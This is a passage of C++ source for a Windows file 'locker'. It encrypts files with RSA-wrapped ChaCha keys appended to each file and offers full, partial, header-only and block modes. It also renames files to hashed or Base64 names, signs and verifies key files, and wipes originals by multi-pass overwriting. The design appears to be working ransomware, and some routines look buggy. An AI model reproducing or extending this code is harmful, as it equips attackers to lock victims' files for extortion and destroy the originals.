			printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}
		WriteEncryptInfo(&FileInfo, EncryptedKey, size, PARTLY_ENCRYPT);
	}
	else if (global::GetEncMode() == HEADER_ENCRYPT)
	{

		if (!EncryptFileHeader(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}
		WriteEncryptInfo(&FileInfo, EncryptedKey, size, HEADER_ENCRYPT);
	}
	else if (global::GetEncMode() == BLOCK_ENCRYPT)
	{
		if (!EncryptFileBlock(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}
		WriteEncryptInfo(&FileInfo, EncryptedKey, size, BLOCK_ENCRYPT);
	}
	
	SUCCESS_return = TRUE;
END:
	if (EncryptedKey)
	{
		RtlSecureZeroMemory(EncryptedKey, size);
		RtlSecureZeroMemory(ChachaIV, 8);
		RtlSecureZeroMemory(ChachaKey, 32);
		memory::m_free(EncryptedKey);
	}
	if(hCryptFile)
		CloseHandle(hCryptFile);
	if(FileInfo.FileHandle && FileInfo.FileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.FileHandle);
	if(FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.newFileHandle);
	if (RsaKey)
		CryptDestroyKey(RsaKey);
	if (CryptoProvider)
		CryptReleaseContext(CryptoProvider, 0);	

	return SUCCESS_return;
}



STATIC BYTE* ReadEncryptInfo
(
	HANDLE handle,
	DWORD* Bit,
	INT* mode_
)
{
	LARGE_INTEGER Offset;	
	Offset.QuadPart = -4;

	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
	{
		printf_s("Failed read file info. GetLastError = %lu\n", GetLastError());
		return NULL;
	}
	BYTE ReadInfo[4];
	if (!ReadFile(handle, ReadInfo, 4, NULL, NULL))
	{
		printf_s("Failed read file info. GetLastError = %lu\n", GetLastError());
		return NULL;
	}
	
	INT mode = ReadInfo[0] - 100;
	INT size_bit = 0;
	for (int i = 1; i < 4; ++i)
		size_bit = size_bit * 10 + (ReadInfo[i] - '0');
	size_bit = size_bit << 1 | size_bit >> (31);
	size_bit -= 1;
	BYTE* read_key = (BYTE*)memory::m_malloc(size_bit);	
	Offset.QuadPart = -(size_bit + 4);
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
	{
		printf_s("Failed read file info. GetLastError = %lu\n", GetLastError());
		return NULL;
	}
	if (!ReadFile(handle, read_key, size_bit - 4, NULL, NULL))
	{
		printf_s("Failed read file info. GetLastError = %lu\n", GetLastError());
		return NULL;
	}
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_BEGIN))
	{
		printf_s("Failed read file info. GetLastError = %lu\n", GetLastError());
		return NULL;
	}
	
	*Bit = size_bit + 4;
	*mode_ = mode;
	return read_key;
}


BOOL filesystem::FileCryptDecrypt
(
	WCHAR* KeyFile,
	WCHAR* FileCrypt,
	WCHAR* newFilename
)
{
	locker::FILE_INFO FileInfo;
	FileInfo.FilePath = FileCrypt;
	FileInfo.Filename = FileCrypt;
	FileInfo.newFileHandle = NULL;
	FileInfo.FileHandle = NULL;
	HCRYPTPROV CryptoProvider = 0;
	HCRYPTKEY RsaKey = 0;
	BOOL SUCCESS_return = FALSE;
	BYTE* EncryptedKey = NULL;
	DWORD EncryptedKeySize = 0;	
	LONG cat;
	INT mode;
	BYTE PrivateKey[4096] = { 0 };

	DWORD dwDataLen = 0;
	
	if (!ReadRSAFile(KeyFile, PrivateKey, &RsaKey, &CryptoProvider))
	{
		printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", KeyFile, GetLastError());
		return FALSE;
	}
	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed ParseFile %ls. GetLastError = %lu.\n", FileCrypt, GetLastError());
		goto END;
	}	

	EncryptedKey = ReadEncryptInfo(FileInfo.FileHandle, &EncryptedKeySize, &mode);
	if (EncryptedKey == NULL)	goto END;
	FileInfo.bit = EncryptedKeySize;
	cat = EncryptedKeySize;

	if (!CryptDecrypt(RsaKey, 0, TRUE, 0, EncryptedKey, &EncryptedKeySize))	
	{
		printf_s("Failed CryptDecrypt. GetLastError = %lu\n", GetLastError());			
		goto END;
	}
	
	BYTE ChachaIV[8];
	BYTE ChachaKey[32];

	memory::Copy(ChachaKey, EncryptedKey, 32);
	memory::Copy(ChachaIV, EncryptedKey + 32, 8);
	ECRYPT_keysetup(&FileInfo.CryptCtx, ChachaKey, 256, 64);
	ECRYPT_ivsetup(&FileInfo.CryptCtx, ChachaIV);

	if (mode == AUTO_ENCRYPT)
	{
		if (FileInfo.Filesize <= 1048576)
		{
			if (!EncryptFileFullData(&FileInfo, newFilename))
			{
				printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}
		}
		else if (FileInfo.Filesize <= 5242880)
		{
			if (!EncryptFilePartly(&FileInfo, newFilename, 20))
			{
				printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}
		}
		else
		{
			if (!EncryptFileHeader(&FileInfo, newFilename))
			{
				printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
				goto END;
			}
		}
	}
	else if (mode == FULL_ENCRYPT)	
	{
		if (!EncryptFileFullData(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileFullData. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}		
	}
	else if (mode == PARTLY_ENCRYPT)	
	{
		if (!EncryptFilePartly(&FileInfo, newFilename, 20))
		{
			printf_s("Failed %ls to EncryptFilePartly. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}		
	}
	else if (mode == HEADER_ENCRYPT)
	{
		if (!EncryptFileHeader(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileHeader. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}
	}
	else if (mode == BLOCK_ENCRYPT)
	{
		if (!EncryptFileBlock(&FileInfo, newFilename))
		{
			printf_s("Failed %ls to EncryptFileBlock. GetLastError = %lu.\n", FileCrypt, GetLastError());
			goto END;
		}
	}

	LARGE_INTEGER Offset;
	Offset.QuadPart = -cat;
	if (SetFilePointerEx(FileInfo.newFileHandle, Offset, NULL, FILE_END)) 
	{
		SetEndOfFile(FileInfo.newFileHandle);		
	}

	SUCCESS_return = TRUE;
END:	
	if(EncryptedKey)
		memory::m_free(EncryptedKey);
	if (FileInfo.FileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.FileHandle);
	if (FileInfo.newFileHandle && FileInfo.newFileHandle != INVALID_HANDLE_VALUE)
		CloseHandle(FileInfo.newFileHandle);
	if (RsaKey)
		CryptDestroyKey(RsaKey);
	if (CryptoProvider)
		CryptReleaseContext(CryptoProvider, 0);
	
	return SUCCESS_return;
}


STATIC VOID dump_hash(CONST BYTE* hash, size_t len) 
{	
	for (size_t i = 0; i < len; ++i) printf("%02X", hash[i]);
	printf("\n");
}

VOID filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
{
	SLIST<locker::HLIST>* list_sorted = new SLIST<locker::HLIST>;
	std::multimap<u32, BYTE*> map;
	locker::PHLIST DataHash = NULL;
	SLIST_FOREACH(DataHash, list)	
		map.insert({ memory::MurmurHash2A(DataHash->hash, 32, 0), DataHash->hash});
	
	for (auto& e : map)
	{
		locker::PHLIST hash_sorted = new locker::HLIST;		
		hash_sorted->hash = e.second;
		hash_sorted->hash_size = 32;
		list_sorted->SLIST_INSERT_HEAD(hash_sorted);
	}


	*list = *list_sorted;
}


BOOL filesystem::HashSignatureFile
(
	SLIST<HASH_LIST>* list,	
	WCHAR* FPath,
	WCHAR* Filename
)
{
	locker::FILE_INFO FileInfo;
	FileInfo.Filename = Filename;
	FileInfo.FilePath = FPath;
	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed ParseFile HashSignatureFile %ls. GetLastError = %lu.\n", Filename, GetLastError());
		return FALSE;
	}


	DWORD BytesRead;
	CHAR* Buffer = (CHAR*)memory::m_malloc(1048576); // 1 MB
	if (!Buffer)
	{
		printf_s("Failed alloc memory\n");
		return FALSE;
	}	
	
	sha256_state ctx;
	sha256_init_context(&ctx);
	size_t hash_s = 32;
	BYTE* out = (BYTE*)memory::m_malloc(hash_s);

	while (ReadFile(FileInfo.FileHandle, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
		sha256_update_context(&ctx, (CONST u8*)Buffer, BytesRead);

	sha256_final_context(&ctx, out);
		

	locker::PHLIST hash = new locker::HLIST;
	hash->hash = out;
	hash->hash_size = hash_s;
	list->SLIST_INSERT_HEAD_SAFE(hash);
	
	memory::m_free(Buffer);
	CloseHandle(FileInfo.FileHandle);

	return TRUE;
}


BOOL filesystem::CreateSignatureFile
(
	SLIST<HASH_LIST>* HashList,
	WCHAR* SignatureName,
	BYTE* SignatureRoot,
	DWORD sig_len
)
{
	VER = TRUE;
	PHASH_LIST DataHash = NULL;
	HANDLE hFile = NULL;
	BOOL success = FALSE;

	WCHAR* locale_hash = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
	DWORD len = GetCurrentDirectoryW(MAX_PATH, locale_hash);
	if(!SignatureName)
		wmemcpy_s(&locale_hash[memory::StrLen(locale_hash)], 20, L"\\signature.laced.txt", 20);
	else 
		wmemcpy_s(&locale_hash[memory::StrLen(locale_hash)], memory::StrLen(SignatureName), SignatureName, memory::StrLen(SignatureName));

	BYTE HASH_SHA[32];
	sha256_state ctx;
	sha256_init_context(&ctx);	
	SLIST_FOREACH(DataHash, HashList)
		sha256_update_context(&ctx, (CONST u8*)DataHash->hash, DataHash->hash_size);		
	sha256_final_context(&ctx, HASH_SHA);

	HCRYPTPROV CryptoProvider = 0;
	HCRYPTKEY RsaKey = 0;
	HCRYPTHASH hHash = 0;	
	BYTE* signature = NULL;

	if (SignatureRoot == NULL)
	{
		signature = (BYTE*)memory::m_malloc(4096);
		if (!ReadRSAFile(global::GetPathSignRSAKey(), signature, &RsaKey, &CryptoProvider))
		{
			printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", global::GetPathSignRSAKey(), GetLastError());
			goto END;
		}
		sig_len = 4096;
	}
	else
	{		
		signature = SignatureRoot;
		if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_AES, 0))
		{
			printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());
			return FALSE;
		}
		
		if (!CryptImportKey(CryptoProvider, SignatureRoot, sig_len, 0, 0, &RsaKey))
		{
			printf("CryptImportKey failed. GetLastError() = %lu\n", GetLastError());
			return FALSE;
		}
	}
	
	if (!CryptCreateHash(CryptoProvider, CALG_SHA_256, 0, 0, &hHash)) 
	{
		printf_s("FailedCryptCreateHash. GetLastError = %lu.\n", GetLastError());
		goto END;
	}
	if (!CryptHashData(hHash, HASH_SHA, 32, 0)) 
	{
		printf_s("Failed CryptHashData. GetLastError = %lu\n", GetLastError());
		goto END;
	}	
	
	if (!CryptSignHashA(hHash, AT_KEYEXCHANGE, NULL, 0, signature, &sig_len)) 	
	{
		printf_s("Failed CryptSignHash. GetLastError() =  %lu\n", GetLastError());
		goto END;
	}
	

	hFile = CreateFileW(locale_hash, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf_s("Failed Create File %ls\n", locale_hash);
		goto END;
	}

	if (!WriteFullData(hFile, signature, sig_len))
	{
		printf_s("Failed WriteFullData. GetLastError = %lu\n", GetLastError());
		goto END;
	}
	
	if(!SignatureName)
		printf("Crypted Hash Sum saved in: %ls\n", locale_hash);
	else
		printf("Crypted hash of public key saved in: %ls\n", SignatureName);

	success = TRUE;
	
END:
	if(hFile) CloseHandle(hFile);
	if(hHash) CryptDestroyHash(hHash);
	if (RsaKey) CryptDestroyKey(RsaKey);
	if (CryptoProvider) CryptReleaseContext(CryptoProvider, 0);
	memory::m_free(locale_hash);
	if (!SignatureRoot && signature)
		memory::m_free(signature);

	return success;
}

BOOL filesystem::VerificationSignatureFile
(
	SLIST<HASH_LIST>* HashList,
	WCHAR* SignatureName,
	BYTE* SignatureRoot,
	DWORD sig_len
)
{
	VER = TRUE;
	BOOL success = FALSE;
	HANDLE hFile = NULL;
	locker::FILE_INFO FileInfo;
	PHASH_LIST DataHash = NULL;
	DWORD dwread;
	BYTE* Buffer = NULL;

	HCRYPTPROV CryptoProvider = 0;
	HCRYPTKEY RsaKey = 0;
	HCRYPTHASH hHash = 0;

	BYTE HASH_SHA[32] = { 0 };

	BYTE* key = NULL;
	if (!SignatureRoot)
	{
		key = (BYTE*)memory::m_malloc(4096);
		if (!ReadRSAFile(global::GetPathSignRSAKey(), key, &RsaKey, &CryptoProvider))
		{
			printf_s("Failed get RSA File - %ls. GetLastError = %lu.\n", global::GetPathSignRSAKey(), GetLastError());
			return FALSE;
		}
	}
	else
	{
		key = SignatureRoot;
		if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_AES, 0))
		{
			printf_s("Failed create provider. GetLastError = %lu.\n", GetLastError());
			return FALSE;
		}

		if (!CryptImportKey(CryptoProvider, SignatureRoot, sig_len, 0, 0, &RsaKey))
		{
			printf("CryptImportKey failed. GetLastError() = %lu\n", GetLastError());
			return FALSE;
		}
	}


	WCHAR* locale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
	GetCurrentDirectoryW(MAX_PATH, locale);
	if(!SignatureName)
		wmemcpy_s(&locale[memory::StrLen(locale)], 20, L"\\signature.laced.txt", 20);
	else
		wmemcpy_s(&locale[memory::StrLen(locale)], memory::StrLen(SignatureName), SignatureName, memory::StrLen(SignatureName));

	FileInfo.FilePath = locale;
	if (!getParseFile(&FileInfo))
	{
		printf_s("Failed getParseFile file doesnt exist. Verify hash file %ls; GetLastError = %lu\n", locale, GetLastError());
		goto END;
	}

	Buffer = (BYTE*)memory::m_malloc(FileInfo.Filesize);
	if (!ReadFile(FileInfo.FileHandle, Buffer, FileInfo.Filesize, &dwread, NULL) || dwread != FileInfo.Filesize)
	{
		printf_s("Failed ReadFile %ls; GetLastError = %lu\n", locale, GetLastError());
		goto END;
	}

	sha256_state ctx;
	sha256_init_context(&ctx);
	SLIST_FOREACH(DataHash, HashList)
		sha256_update_context(&ctx, (CONST u8*)DataHash->hash, DataHash->hash_size);
	sha256_final_context(&ctx, HASH_SHA);


	if (!CryptCreateHash(CryptoProvider, CALG_SHA_256, 0, 0, &hHash)) 
	{
		printf_s("Failed CryptCreateHash. GetLastError =  %lu\n", GetLastError());
		goto END;
	}
	
	if (!CryptHashData(hHash, HASH_SHA, 32, 0)) 
	{
		printf_s("Failed CryptHashData. GetLastError =  %lu\n", GetLastError());
		goto END;
	}

	if (!CryptVerifySignatureA(hHash, Buffer, dwread, RsaKey, NULL, 0)) 
	{
		printf_s("Failed CryptVerifySignature. GetLastError = %lu\n", GetLastError());
		printf_s("Signature verification is FAILED\n");
	}
	else
		printf("Signature verification SUCCESS\n");

	success = TRUE;

END:
	if(FileInfo.FileHandle) CloseHandle(FileInfo.FileHandle);
	if (hHash) CryptDestroyHash(hHash);
	if (RsaKey) CryptDestroyKey(RsaKey);
	if (CryptoProvider) CryptReleaseContext(CryptoProvider, 0);
	memory::m_free(locale);
	if (Buffer)
		memory::m_free(Buffer);
	if (!SignatureRoot && key)
		memory::m_free(key);


	return success;
}

INLINE VOID memzero_explicit(BYTE* buff, DWORD size)
{
	volatile BYTE* ptr = buff;
	while (size--) *ptr++ = 0;
}

VOID filesystem::RootKeySignatureTrust(VOID)
{
	SLIST<HASH_LIST>* HashListRoot = new SLIST<HASH_LIST>;
	BYTE* g_PublicKeyRoot = NULL;
	BYTE* g_PrivateKeyRoot = NULL;
	DWORD size = 0;
	HashSignatureFile(HashListRoot, global::GetPath(), (WCHAR*)L"CHECK-RSA_public_key_laced.txt");	
	
	if (global::GetStatus())
	{
		locker::LoadPrivateRootKey(&g_PrivateKeyRoot, &size);
		if (!g_PrivateKeyRoot)
		{
			printf("Failed Load Public Root Key\n");
			goto end;
		}
		CreateSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PrivateKeyRoot, size);
	}
	else
	{		
		locker::LoadPublicRootKey(&g_PublicKeyRoot, &size);
		if (!g_PublicKeyRoot)
		{
			printf("Failed Load Public Root Key\n");
			goto end;
		}
		VerificationSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PublicKeyRoot, size);
	}

end:
	if (g_PublicKeyRoot)
	{
		memzero_explicit(g_PublicKeyRoot, size);
		memory::m_free(g_PublicKeyRoot);
	}
		
	if (g_PrivateKeyRoot)
	{
		memzero_explicit(g_PrivateKeyRoot, size);
		memory::m_free(g_PrivateKeyRoot);
	}
	
	PHASH_LIST Data = NULL;
	SLIST_FOREACH(Data, HashListRoot)
		delete[] Data->hash;
	delete HashListRoot;
}


STATIC VOID SafeURLBase64(WCHAR* str, size_t size, size_t mode)
{
	if (mode == BASE_CRYPT)
	{
		for (INT i = 0; i < size; ++i)
		{
			if (str[i] == L'-')
			{
				str[i] = L'+';
				continue;
			}
			if (str[i] == L'_')
			{
				str[i] = L'/';
			}
		}
	}
	else if (mode == BINARY_CRYPT)
	{
		for (INT i = 0; i < size; ++i)
		{
			if (str[i] == L'+')
			{
				str[i] = L'-';
				continue;
			}
			if (str[i] == L'/')
			{
				str[i] = L'_';
			}
		}
	}
}

WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath)
{
	size_t len_path = memory::StrLen(Path);
	size_t len_filename = memory::StrLen(Filename);
	size_t len_FPath = memory::StrLen(FPath);	

	if (memory::StrStrCW(exst, ECRYPT_NAME_P))
	{		
		size_t len = len_FPath - ECRYPT_NAME_LEN;
		WCHAR* name = (WCHAR*)memory::m_malloc((260) * sizeof(WCHAR));
		wmemcpy_s(name, len, FPath, len);
		
		if (global::GetCryptName() == BASE64_NAME)
		{
			SafeURLBase64(&name[len_path + 1], len_filename - ECRYPT_NAME_LEN, BASE_CRYPT);

			VOID* Base64 = NULL;
			DWORD size;			
			if (!Base64Encode(&Base64, (BYTE*)&name[len_path + 1], 0, &size, BASE_CRYPT_W))
			{
				printf_s("Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());				
				goto END;
			}
			if (Base64 == NULL)
			{
				printf_s("Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END;
			}				
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + 2 + size) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';					
			
			MultiByteToWideChar(CP_UTF8, 0, (CHAR*)Base64, size, &FullPath[len_path + 1], size);

			memory::m_free(Base64);
			memory::m_free(name);
			return FullPath;
		}
	END:
		return name;
	}
	else
	{
		if (global::GetCryptName() == HASH_NAME)
		{
			CHAR ptr[260] = { 0 };
			u8 out[32] = { 0 };
			WideCharToMultiByte(CP_UTF8, 0, Filename, -1, ptr, len_filename, NULL, NULL);
			sha256((CONST u8*)ptr, len_filename, out);
			u8* name = memory::BinaryToHex(out, 32);
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + 2 + 64 + 6) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';
			MultiByteToWideChar(CP_UTF8, 0, (CHAR*)name, 64, &FullPath[len_path + 1], 64);
			wmemcpy_s(&FullPath[memory::StrLen(FullPath)], ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
			return FullPath;
		}
		if (global::GetCryptName() == BASE64_NAME)
		{						
			if ((len_filename + (len_filename / 3)) > MAX_PATH)
			{
				printf_s("(Size + size / 3) must be smaller than 260smbls. File: %ls\n", Filename);
				goto END_;
			}
						
			CHAR ptr[260] = { 0 };				
			WideCharToMultiByte(CP_UTF8, 0, Filename, -1, ptr, len_filename, NULL, NULL);
			

			VOID* Base64 = NULL;
			DWORD size;
			if (!Base64Encode(&Base64, (BYTE*)ptr, len_filename, &size, BINARY_CRYPT_W))
			{
				printf_s("Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END_;
			}
			if (Base64 == NULL)
			{
				printf_s("Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END_;
			}
						
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + size + ECRYPT_NAME_LEN + 2) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';
			wmemcpy_s(&FullPath[len_path + 1], size, (WCHAR*)Base64, size);
			wmemcpy_s(&FullPath[size + len_path + 1], ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);			
			SafeURLBase64(&FullPath[len_path + 1], size, BINARY_CRYPT);

			memory::m_free(Base64);
			return FullPath;
		}
	END_:
		std::wstring wstr(FPath);
		wstr += std::wstring(ECRYPT_NAME_P);
		WCHAR* ret = (WCHAR*)memory::m_malloc((wstr.size() + 1) * sizeof(WCHAR));
		wmemcpy_s(ret, wstr.size(), wstr.c_str(), wstr.size());
		return ret;
	}

	WCHAR* empty = (WCHAR*)memory::m_malloc((ECRYPT_NAME_LEN + 1) * sizeof(WCHAR));
	memcpy_s(empty, ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	return empty;
}


STATIC BOOL Write(FILE_INFO* fi, BYTE* buff, WCHAR* Path)
{
	size_t size_mb = 1048576;  // 1 MB	
	SetFilePointer(fi->FileHandle, 0, NULL, FILE_BEGIN);
	auto fsize = fi->Filesize;
	DWORD toWrite;
	DWORD written = 0;
	while (fsize > 0)
	{
		toWrite = (DWORD)fsize >= size_mb ? size_mb : fsize;
		if (!WriteFullData(fi->FileHandle, buff, toWrite))
		{
			printf_s("Failed WriteFullData in OverWriteFile %ls. GetLastError = %lu\n", Path, GetLastError());			
			return FALSE;
		}
		written += toWrite;
		fsize -= written;
	}
	
	return TRUE;
}

BOOL filesystem::OverWriteFile(WCHAR* Path)
{
	FILE_INFO fi;
	fi.FilePath = Path;
	if (getParseFile(&fi) && fi.FileHandle != INVALID_HANDLE_VALUE)
	{		
		if (global::GetModeOverWrite() == ZEROS)
		{
			BYTE* zeros = (BYTE*)memory::m_malloc(1048576);
			memory::memzero_explicit(zeros, 1048576);
			for (int i = 0; i < global::GetCountOverWrite(); ++i)
			{
				Write(&fi, zeros, Path);
			}
			memory::m_free(zeros);
		}
		else
		{

			BYTE* random = (BYTE*)memory::m_malloc(1048576);
			HCRYPTPROV CryptoProvider = 0;
			if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
			{
				printf_s("Failed create provider in OverWriteFile. GetLastError = %lu.\n", GetLastError());
				memory::m_free(random);
				goto END;
			}
			CryptGenRandom(CryptoProvider, 1048576, random);

			if (global::GetModeOverWrite() == RANDOM)
			{
				for (int i = 0; i < global::GetCountOverWrite(); ++i)
				{			
					Write(&fi, random, Path);
				}
			}
			else if (global::GetModeOverWrite() == DOD)
			{
				BYTE* zeros = (BYTE*)memory::m_malloc(1048576); // 1 MB
				memory::memzero_explicit(zeros, 1048576);
				for (int i = 0; i < global::GetCountOverWrite(); ++i)
				{
					Write(&fi, zeros, Path);
					Write(&fi, random, Path);
				}
				memory::m_free(zeros);
			}
			memory::m_free(random);
			if (CryptoProvider)
				CryptReleaseContext(CryptoProvider, 0);
		}		
	}
	else
		return FALSE;
	
END:
	CloseHandle(fi.FileHandle);
	return TRUE;
}
